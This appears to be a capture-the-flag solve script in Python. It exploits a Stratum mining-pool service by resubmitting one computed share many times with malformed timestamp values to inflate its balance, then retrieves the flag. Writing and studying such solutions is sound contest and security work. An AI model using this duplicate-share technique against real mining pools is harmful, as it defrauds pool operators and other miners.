#!/usr/bin/env python2

from pwn import *
import sys, subprocess

from stratum import Stratum, FINAL_DIFF
from money import superhash

TIMEOUT = 200

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    # context.log_level = 'DEBUG'

    conn = remote(host, port)

    s = Stratum(conn)
    s.login()

    good_diff = 50 * 96 * 5
    good_target = ['%08x' % (0xFFFFFFFF / good_diff + 1) + '0' * 0x38]

    end = time.time() + TIMEOUT
    while time.time() < end:
        s.set_target(good_target)
        time.sleep(0.1)
        cur_job = s.job
        hdr = cur_job['header'] + struct.pack('<II', s.nonce1 +
                cur_job['id'], 0).encode('hex')
        sol = superhash(hdr, good_diff, 96, 0)[0]
        log.debug('sol: %s', sol)
        nonce2, hash_, diff = sol.split()
        for i in xrange(150):
            timestamp_ = ('0z%x' % (i)).ljust(8)
            res = s.request_sync('mining.submit', [s.username,
                cur_job['id'], nonce2, timestamp_])
            if res.get('result') != [True]:
                if res.get('error'):
                    log.info('submitted %d soluntions before error: %s', i, res.get('error'))
                    break
        share = s.get_share()
        balance = s.get_balance()
        speed = s.get_speed()
        log.info('share = %d balance = %s speed = %s', share, balance, speed)
        if balance >= FINAL_DIFF:
            break

    # we have enough balance or timeout
    if balance >= FINAL_DIFF:
        log.info('final balance = %s', balance)

        bits = int(s.query_flag(range(192))[::-1], 2)
        flag = hex(bits)[2:].strip('L').decode('hex')[::-1].encode('hex')

        print "FLAG:", flag
    else:
        log.warn('exploit failed due to timeout(unlucky)')

    sys.exit(0)


if __name__ == '__main__':
    main()
    

